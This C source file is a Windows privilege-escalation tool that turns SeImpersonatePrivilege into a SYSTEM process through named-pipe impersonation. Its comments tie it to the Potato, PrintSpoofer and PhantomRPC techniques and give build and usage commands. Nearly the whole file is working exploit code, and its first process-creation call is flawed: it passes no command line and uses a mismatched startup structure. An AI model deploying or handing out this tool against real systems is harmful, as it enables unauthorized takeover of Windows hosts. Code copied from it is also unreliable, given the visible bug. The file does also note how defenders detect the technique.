/*
 * named_pipe_impersonate.c - Service-account -> SYSTEM via named-pipe client impersonation.
 *
 * Core primitive behind the entire "Potato" family and PhantomRPC: a process holding
 * SeImpersonatePrivilege creates a named pipe, coerces a SYSTEM client to connect, calls
 * ImpersonateNamedPipeClient to assume its token, duplicates that token to a primary
 * token, and spawns a process as SYSTEM with CreateProcessWithTokenW.
 *
 * This tool implements the *server* side end-to-end (the reusable half). The coercion of
 * a privileged client is mechanism-specific:
 *   - Classic Potato : DCOM/BITS OXID resolver coercion
 *   - PrintSpoofer   : SpoolSS RPC over \pipe\spoolss
 *   - PhantomRPC     : squat a non-existent RPC endpoint (e.g. \pipe\W32TIME) a SYSTEM
 *                      binary connects to, no service disable required (Kaspersky 2026)
 * Provide your coercion trigger separately, or run a SYSTEM client by hand to validate.
 *
 * BUILD (MSVC x64):  cl /O2 /W3 named_pipe_impersonate.c advapi32.lib
 * USAGE:  named_pipe_impersonate.exe \\.\pipe\W32TIME "C:\\Windows\\System32\\cmd.exe"
 *
 * OPSEC: pipe creation + ImpersonateNamedPipeClient + CreateProcessWithTokenW is a
 * high-fidelity detection (Elastic "Privilege Escalation via Named Pipe Impersonation",
 * Sysmon EID 17/18 + 4624 logon type 9). See references/rpc-alpc-boundary.md.
 */
#include <windows.h>
#include <stdio.h>

static int run_as_system(HANDLE imp_token, const char *cmd) {
    HANDLE primary = NULL;
    if (!DuplicateTokenEx(imp_token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
                          TokenPrimary, &primary)) {
        printf("[-] DuplicateTokenEx %lu\n", GetLastError());
        return 1;
    }
    STARTUPINFOA si = { sizeof(si) };
    si.lpDesktop = (char*)"winsta0\\default";
    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessWithTokenW(primary, LOGON_WITH_PROFILE, NULL,
                                      (LPWSTR)NULL, 0, NULL, NULL,
                                      (LPSTARTUPINFOW)&si, &pi);
    if (!ok) {
        /* Fallback for service contexts: CreateProcessAsUser */
        wchar_t wcmd[1024]; MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, 1024);
        STARTUPINFOW siw = { sizeof(siw) }; siw.lpDesktop = (LPWSTR)L"winsta0\\default";
        ok = CreateProcessAsUserW(primary, NULL, wcmd, NULL, NULL, FALSE,
                                  CREATE_NEW_CONSOLE, NULL, NULL, &siw, &pi);
    }
    if (ok) {
        printf("[+] spawned PID %lu as impersonated token\n", pi.dwProcessId);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    } else {
        printf("[-] process creation %lu\n", GetLastError());
    }
    CloseHandle(primary);
    return ok ? 0 : 1;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("usage: %s <\\\\.\\pipe\\Name> <command>\n", argv[0]);
        return 1;
    }
    const char *pipe = argv[1];
    const char *cmd  = argv[2];

    /* NULL DACL so any client (including SYSTEM) can connect. */
    SECURITY_DESCRIPTOR sd; InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    SECURITY_ATTRIBUTES sa = { sizeof(sa), &sd, FALSE };

    HANDLE hp = CreateNamedPipeA(pipe, PIPE_ACCESS_DUPLEX,
                                 PIPE_TYPE_MESSAGE | PIPE_WAIT, 1,
                                 4096, 4096, 0, &sa);
    if (hp == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe %lu\n", GetLastError());
        return 1;
    }
    printf("[+] pipe server up: %s  (now trigger SYSTEM client / coercion)\n", pipe);

    if (!ConnectNamedPipe(hp, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        printf("[-] ConnectNamedPipe %lu\n", GetLastError());
        CloseHandle(hp); return 1;
    }
    /* Force the client to push at least one message so its context is available. */
    char tmp[8]; DWORD n = 0; ReadFile(hp, tmp, sizeof(tmp), &n, NULL);

    if (!ImpersonateNamedPipeClient(hp)) {
        printf("[-] ImpersonateNamedPipeClient %lu\n", GetLastError());
        CloseHandle(hp); return 1;
    }
    printf("[+] impersonating connected client\n");

    HANDLE thr_tok = NULL;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &thr_tok);
    char user[256]; DWORD ul = sizeof(user);
    GetUserNameA(user, &ul);
    printf("[*] impersonated identity: %s\n", user);

    int rc = run_as_system(thr_tok, cmd);

    RevertToSelf();
    if (thr_tok) CloseHandle(thr_tok);
    CloseHandle(hp);
    return rc;
}
